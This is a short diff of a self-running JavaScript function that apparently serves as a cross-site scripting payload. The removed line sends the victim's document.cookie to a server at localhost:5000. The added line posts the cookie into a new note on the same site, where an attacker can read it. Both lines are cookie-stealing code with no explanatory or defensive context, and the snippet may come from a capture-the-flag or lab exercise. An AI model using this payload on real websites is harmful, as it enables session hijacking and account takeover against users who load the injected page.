@@ -1,3 +1,3 @@
 (function run() {
-	fetch('http://localhost:5000/' + document.cookie);
+	$.post('/note/new', {title:'From Note', content:document.cookie, submit:'save'});
 })();
